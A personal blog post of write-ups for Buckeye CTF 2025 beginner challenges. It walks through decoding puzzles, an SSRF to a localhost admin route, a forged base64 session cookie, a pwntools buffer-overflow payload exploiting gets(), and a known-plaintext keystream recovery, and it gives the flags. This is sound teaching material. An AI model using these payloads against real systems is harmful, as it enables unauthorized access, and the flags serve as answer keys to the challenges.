---
layout: post
title:  "Buckeye 2025 beginner challenges"
date:   2025-11-10 17:37:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /buckeye-beginner/
---
* TOC
{:toc}

## 1985 (forensics)

**Category**: Beginner forensics

**Description**: I found this old email in my inbox from 1985, can you help me figure out what it means? 

I get the file `email.txt` containing this:
```shell
cat email.txt  
Hey man, I wrote you that flag printer you asked for:  
  
begin 755 FLGPRNTR.COM  
MOAP!@#PD=`:`-"I&Z_6Z'`&T"<TAP[1,,,#-(4A)7DQ1;AM.=5,:7W5_61EU  
;:T1U&4=?1AY>&EAU95AU3AE)&D=:&T9O6%<D  
`  
end
```

It is a `uuencoded` MS-DOS .COM program. 

I get the binary with this command: `uudecode email.txt`. Then run it with `dosbox`.

`bctf{D1d_y0u_Us3_An_3mul4t0r_Or_d3c0mp1lEr}`

___

## Mind Boggle (misc)

**Category**: Beginner misc

**Description**: My friend gave me this file, but I have no idea what it means!!!!! HELP

I get a file containing some brainfuck code:
```shell
cat mystery.txt  
-[----->+<]>++.++++.---.[->++++++<]>.[---->+++<]>+.-[--->++++<]>+.>-[----->+<]>.---.+++++.++++++++++++.-----------.[->++++++<]>+.--------------.---.-.---.++++++.---.+++.+++++++++++.-------------.++.+..-.----.++...-[--->++++<]>+.-[------>+<]>..--.-[--->++++<]>+.>-[----->+<]>.---.++++++.+..++++++++++.------------.+++.-----.-.+++++..----.---.++++++.-..++.--.+.-.--.+++.---..--.++.++++++.----..+.---.+++.+++++++++++.-------------.++.+..-.----.++...-[--->++++<]>+.-[------>+<]>...--..+++.-.++.----.++.-.+++.-----.---.+++++.+.+.--..++++.------..+.+++++++++++++.>-[----->+<]>.++...-.++++.---.----.++++++.+.----.-[--->++++<]>.[---->+++<]>+.+.--.++.--.++++++.
```

I go to [https://www.dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language) and decode it into this string:
```shell
596D4E305A6E7430636A467762444E664E30677A583277306557565363313955636A467762444E66644768465830567559334A35554851784D453539
```

Put it in cyberchef and do `from hex` then `from base64` to get the flag.

`bctf{tr1pl3_7H3_l4yeRs_Tr1pl3_thE_EncryPt10N}`

___

## ebg13 (web)

**Category**: Beginner web

**Description**: V znqr na ncc gung yrgf lbh ivrj gur ebg13 irefvba bs nal jrofvgr! [https://ebg13.challs.pwnoh.io](https://ebg13.challs.pwnoh.io). 

The description `rot13` decodes to this:
```shell
I made an app that lets you view the rot13 version of any website!
```

I get the `server.js` which shows how the site will work:
```shell
cat server.js  
import Fastify from 'fastify';  
import * as cheerio from 'cheerio';  
  
const FLAG = process.env.FLAG ?? "bctf{fake_flag}";  
  
const INDEX_HTML = `  
<!doctype html>  
<html lang="en">  
  
<head>  
 <meta charset="utf-8" />  
 <meta name="viewport" content="width=device-width,initial-scale=1" />  
 <title>ebj13</title>  
 <link rel="stylesheet" href="https://unpkg.com/98.css" />  
 <style>  
   body {  
     background: #008080;  
     display: flex;  
     align-items: center;  
     justify-content: center;  
     height: 100vh;  
     margin: 0;  
   }  
  
   .window {  
     zoom: 1.5;  
     width: 460px;  
   }  
  
   .window-body {  
     text-align: center;  
   }  
  
   form {  
     display: flex;  
     justify-content: center;  
     gap: 8px;  
     flex-wrap: wrap;  
     margin-top: 10px;  
   }  
  
   input[type="text"] {  
     width: 300px;  
   }  
  
   .example-buttons {  
     display: flex;  
     justify-content: center;  
     gap: 8px;  
     margin-top: 12px;  
   }  
 </style>  
</head>  
  
<body>  
 <div class="window" role="application">  
   <div class="title-bar">  
     <div class="title-bar-text">ebj13</div>  
     <div class="title-bar-controls">  
       <button aria-label="Minimize"></button>  
       <button aria-label="Maximize"></button>  
       <button aria-label="Close"></button>  
     </div>  
   </div>  
   <div class="window-body">  
     <p><strong>Enter URL</strong></p>  
  
     <form action="/ebj13" method="get">  
       <input type="text" name="url" placeholder="Enter a URL" id="urlInput" />  
       <button type="submit" class="button">ebj13 it!</button>  
     </form>  
  
     <div class="example-buttons">  
       <button class="button" type="button" onclick="urlInput.value = 'https://example.com'">example.com</button>  
       <button class="button" type="button"  
         onclick="urlInput.value = 'https://news.ycombinator.com'">news.ycombinator.com</button>  
     </div>  
  
     <p style="margin-top:10px;font-size:12px;">Paste a full URL (including https://)</p>  
   </div>  
 </div>  
</body>  
  
</html>    
`;  
  
const fastify = Fastify({ logger: true });  
  
function rot13(str) {  
 return str.replace(/[a-zA-Z]/g, (c) =>  
   String.fromCharCode(  
     c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)  
   )  
 );  
}  
  
function rot13TextNodes($, node) {  
 $(node)  
   .contents()  
   .each((_, el) => {  
     if (el.type === 'text') {  
       el.data = rot13(el.data);  
     } else {  
       rot13TextNodes($, el);  
     }  
   });  
}  
  
fastify.get('/', async (req, reply) => {  
 return reply.type('text/html').send(INDEX_HTML);  
});  
  
fastify.get('/ebj13', async (req, reply) => {  
 const { url } = req.query;  
  
 if (!url) {  
   return reply.status(400).send('Missing ?url parameter');  
 }  
  
 try {  
   const res = await fetch(url);  
   const html = await res.text();  
  
   const $ = cheerio.load(html);  
   rot13TextNodes($, $.root());  
  
   const modifiedHtml = $.html();  
  
   reply.type('text/html').send(modifiedHtml);  
 } catch (err) {  
   reply.status(500).send(`Error fetching URL`);  
 }  
});  
  
fastify.get('/admin', async (req, reply) => {  
   if (req.ip === "127.0.0.1" || req.ip === "::1" || req.ip === "::ffff:127.0.0.1") {  
     return reply.type('text/html').send(`Hello self! The flag is ${FLAG}.`)  
   }  
  
   return reply.type('text/html').send(`Hello ${req.ip}, I won't give you the flag!`)  
})  
  
fastify.listen({ port: 3000, host: '0.0.0.0' }, (err, address) => {  
 if (err) throw err;  
 console.log(`Server running at ${address}`);  
});
```

When visiting the site I can enter a website and it will send us to the rot13 encoded version of that site. In burp I see we are being redirected with this parameter:
```shell
/ebj13?url=https%3A%2F%2Fexample.com
```

To get the flag I need to visit `http://127.0.0.1:3000/admin`:
```shell
https://ebg13.challs.pwnoh.io/ebj13?url=http://127.0.0.1:3000/admin

https://ebg13.challs.pwnoh.io/ebj13?url=http%3A%2F%2F127.0.0.1%3A3000%2Fadmin
```

This exploits a basic SSRF. From there the flag needs decoded from rot13: `opgs{jung_unccraf_vs_v_hfr_guvf_jrofvgr_ba_vgfrys}`

`bctf{what_happens_if_i_use_this_website_on_itself}`

___

## Ramesses (web)

**Category**: Beginner web

**Description**: Do you dare enter the tomb of Pharaoh Dave Ramesses?

I get the challenge files. Here is `main.py`:
```t
from flask import Flask, render_template, request, make_response, redirect, url_for  
import base64  
import json  
import os  
  
flag = os.getenv("FLAG", "bctf{fake_flag}")  
  
app = Flask(__name__)  
  
  
@app.route("/", methods=["GET", "POST"])  
def home():  
   if request.method == "POST":  
       name = request.form.get("name", "")  
       cookie_data = {"name": name, "is_pharaoh": False}  
       encoded = base64.b64encode(json.dumps(cookie_data).encode()).decode()  
  
       response = make_response(redirect(url_for("tomb")))  
       response.set_cookie("session", encoded)  
       return response  
  
   return render_template("index.html")  
  
  
@app.route("/tomb")  
def tomb():  
   session_cookie = request.cookies.get("session")  
   if not session_cookie:  
       return redirect(url_for("home"))  
   try:  
       user = json.loads(base64.b64decode(session_cookie).decode())  
   except Exception:  
       return redirect(url_for("home"))  
   return render_template("tomb.html", user=user, flag=flag)  
  
  
@app.route("/logout")  
def logout():  
   response = make_response(redirect(url_for("home")))  
   response.set_cookie("session", "", expires=0)  
   return response  
  
  
if __name__ == "__main__":  
   app.run(host="0.0.0.0", port=8000)
```

I try to login with any username and password and intercept the request with burp. I see the request made to `/tomb` with the cookie `eyJuYW1lIjogIkRhdmUiLCAiaXNfcGhhcmFvaCI6IGZhbHNlfQ==` which base64 decodes to `{"name": "Dave", "is_pharaoh": false}`. 

I base64 encode the string with `true` instead: `eyJuYW1lIjogIkRhdmUiLCAiaXNfcGhhcmFvaCI6IHRydWV9`. After forwarding the request with this as the cookie I get the flag:
```shell
# Pharaoh Dave

What a happy day! Heaven and earth rejoice, for thou art the great lord of Egypt.

All lands say unto him: The flag is bctf{s0_17_w45_wr177en_50_1t_w45_d0n3}
```

`bctf{s0_17_w45_wr177en_50_1t_w45_d0n3}`

___

## The Professor's Files (forensics)

**Category**: Beginner forensics

**Description**: A professor uploaded their ethics report for review, but something about it seems… off. The document’s formatting feels inconsistent, almost like it was edited by hand rather than exported normally. The metadata looks strange too, and there’s a rumor that the professor hides sensitive data in plain sight.

I get the file `OSU_Ethics_Report.docx`:
```shell
file OSU_Ethics_Report.docx  
OSU_Ethics_Report.docx: Microsoft OOXML
```

I unzip the docx in its own directory and grep for the flag:
```shell
grep -R bctf  
word/theme/theme1.xml:      <!-- bctf{docx_is_zip} -->
```

`bctf{docx_is_zip}`

___

## Viewer (pwn)

**Category**: Beginner pwn

**Description**: Viewer to view many things. `ncat --ssl viewer.challs.pwnoh.io 1337`

I get two files. The source code and the binary:
```shell
file viewer  
viewer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=11f2226a56cb345e3459deee21832cbac8d59778, for GNU/Linux 3.2.0, not stripped
```

Contents of `chall.c`
```t
#include <stdbool.h>  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
  
typedef enum {  
   INVALID,  
   FIBONACCI,  
   ART,  
   FLAG,  
   RANDOM  
} viewee_t;  
  
void handle_viewee(viewee_t viewee) {  
   int a, b, c;  
   int i;  
   FILE *file;  
   char flag_char;  
   switch (viewee) {  
   case INVALID:  
       printf("Error: Unauthorized or invalid input\n");  
       break;  
   case FIBONACCI:  
       a = 0;  
       b = 1;  
       for (i = 0; i < 10; i++) {  
           c = a + b;  
           a = b;  
           b = c;  
           printf("%i: %i\n", i, a);  
       }  
       break;  
   case ART:  
       printf("  ||/\\\n"  
              "  ||  \\\n"  
              "  |    \\\n"  
              " /______\\\n"  
              "/|      |\\\n"  
              " |  ||  |\n"  
              " |__||__|\n");  
       break;  
   case FLAG:  
       file = fopen("flag.txt", "r");  
       while (fread(&flag_char, sizeof(flag_char), 1, file)  
              == sizeof(flag_char)) {  
           putchar(flag_char);  
       }  
       putchar('\n');  
       fclose(file);  
       break;  
   case RANDOM:  
       printf("Rand: %i\n", rand());  
       break;  
   }  
}  
  
int main() {  
   viewee_t viewee = INVALID;  
   char input[10];  
   bool is_admin = false;  
  
   setvbuf(stdin, NULL, _IONBF, 0);  
   setvbuf(stdout, NULL, _IONBF, 0);  
  
   printf("What would you like to view?\n> ");  
   gets(input);  
  
   if (strcmp(input, "fibonacci") == 0) {  
       viewee = FIBONACCI;  
   } else if (strcmp(input, "art") == 0) {  
       viewee = ART;  
   } else if (strcmp(input, "flag") == 0 && is_admin) {  
       viewee = FLAG;  
   } else if (strcmp(input, "random") == 0) {  
       viewee = RANDOM;  
   }  
  
   handle_viewee(viewee);  
  
   return 0;  
}
```

I can use pwntools and send `flag` with a null byte so `strcmp` sees `flag` then some padding and set admin to 1:
```python
from pwn import *
import sys

context.log_level = "info"

def exploit_remote(host="viewer.challs.pwnoh.io", port=1337):
    p = remote(host, port, ssl=True)
    # flag + NULL byte so strcmp sees "flag" + padding + then set is_admin = 1
    payload = b"flag\x00" + b"A"*5 + b"\x01"
    p.recvuntil(b"> ")
    p.sendline(payload)
    try:
        out = p.recvall(timeout=5)
        print(out.decode(errors="replace"))
    except EOFError:
        print("closed connection")
    finally:
        p.close()

if __name__ == "__main__":
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = "viewer.challs.pwnoh.io"
        port = 1337

    print(f"connecting to {host}:{port}")
    exploit_remote(host, port)
```

Output:
```shell
python3 pwn1.py  
connecting to viewer.challs.pwnoh.io:1337  
[+] Opening connection to viewer.challs.pwnoh.io on port 1337: Done  
[+] Receiving all data: Done (44B)  
[*] Closed connection to viewer.challs.pwnoh.io port 1337  
bctf{I_C4nt_Enum3rAte_7hE_vuLn3r4biliTI3s}
```

`bctf{I_C4nt_Enum3rAte_7hE_vuLn3r4biliTI3s}`

___

## Augury (crypto)

**Category**: Beginner crypto

**Description**: This file storage uses only the most secure encryption techniques. If you are using [pwntools](https://docs.pwntools.com/en/stable/), use: `remote("augury.pwnoh.io", 1337, ssl=True)`. 
`ncat --ssl augury.challs.pwnoh.io 1337`

I get the file `main.py`:
```t
import hashlib  
  
stored_data = {}  
  
def generate_keystream(i):  
   return (i * 3404970675 + 3553295105) % (2 ** 32)  
  
def upload_file():  
   print("Choose a name for your file")  
   name = input()  
   if name in stored_data:  
       print("There is already a file with that name")  
       return  
   print("Remember that your privacy is our top priority and all stored files are encrypted.")  
   print("Choose a password")  
   password = input()  
   m = hashlib.shake_128()  
   m.update(password.encode())  
   keystream = int.from_bytes(m.digest(4), byteorder="big")  
   print("Now upload the contents of your file in hexadecimal")  
   contents = input()  
   b = bytearray(bytes.fromhex(contents))  
   for i in range(0, len(b), 4):  
       key = keystream.to_bytes(4, byteorder="big")  
       b[i + 0] ^= key[0]  
       if i + 1 >= len(b):  
           continue  
       b[i + 1] ^= key[1]  
       if i + 2 >= len(b):  
           continue  
       b[i + 2] ^= key[2]  
       if i + 3 >= len(b):  
           continue  
       b[i + 3] ^= key[3]  
       keystream = generate_keystream(keystream)  
   stored_data[name] = b  
   print("Your file has been uploaded and encrypted")  
  
  
def view_files():  
   print("Available files:")  
   for i in stored_data.keys():  
       print(i)  
   print("Choose a file to get")  
   name = input()  
   if name not in stored_data:  
       print("That file is not available")  
       return  
   print(stored_data[name].hex())  
  
def main():  
   print("Welcome to Augury")  
   print("The best place for secure storage!")  
   while True:    
       print("Please select an option:")  
       print("1. Upload File")  
       print("2. View Files")  
       print("3. Exit")  
       choice = input()  
       match choice:  
           case "1":  
               upload_file()  
           case "2":  
               view_files()  
           case "3":  
               exit()  
  
main()
```

Connecting to the server I can see an encrypted `png`:
```shell
ncat --ssl augury.challs.pwnoh.io 1337  
Welcome to Augury  
The best place for secure storage!  
Please select an option:  
1. Upload File  
2. View Files  
3. Exit  
> 2  
Available files:  
secret_pic.png  
Choose a file to get  
> secret_pic.png  
f51f4509795a9481aba0a43f92a859a5beba6693d20da0807ad21ddac99960029743489ee6e3c5229583460cae586269d0da0a2da78c8833080514e641c66d02670b7a7bc2d8c9d927d052a6d64548eb4238e970f302dbddc995e57a763a5a0bc26d99e488985ece3ec1597ec898fd696109ff07519d837efd400f095bc2d56ef557cfe37765571bca128a8e60de4caf4aeccf15225ce0ba22fef0ef6f9bfad0ac5a8c52f5d64099ad87895acc96fcd680ccbe4d47e666672438f9404b92dcfea389cb85a...
```

I saved the entire encrypted hex string to the file `enc-png`. I know the `png` header will be at the start of the file so I can use this to recover the initial keystream and then decrypt the full file. I ran this python:
```python
import hashlib

# linear congruential generator from main.py
def generate_keystream(i):
    return (i * 3404970675 + 3553295105) % (2 ** 32)

# read the encrypted hex string
with open("enc-png", "r") as f:
    enc_hex = f.read().strip()

# convert to bytearray
enc_bytes = bytearray.fromhex(enc_hex)

# known png header
png_header = b"\x89PNG\r\n\x1a\n"

# recover initial keystream from the first 4 bytes
keystream_bytes = bytes([enc_bytes[i] ^ png_header[i] for i in range(4)])
S = int.from_bytes(keystream_bytes, "big")

# decrypt the full file
decrypted = bytearray(enc_bytes)
for i in range(0, len(decrypted), 4):
    key = S.to_bytes(4, "big")
    for j in range(4):
        if i + j >= len(decrypted):
            break
        decrypted[i + j] ^= key[j]
    S = generate_keystream(S)

# save the recovered png
with open("recovered.png", "wb") as f:
    f.write(decrypted)

print("Decrypted! Saved as recovered.png")
```

Output:
```shell
python3 decrypt-png.py  
Decrypted! Saved as recovered.png
```

`recovered.png`:

![Alt text](/images/recovered.png)

`bctf{pr3d1c7_7h47_k3y57r34m}`

___
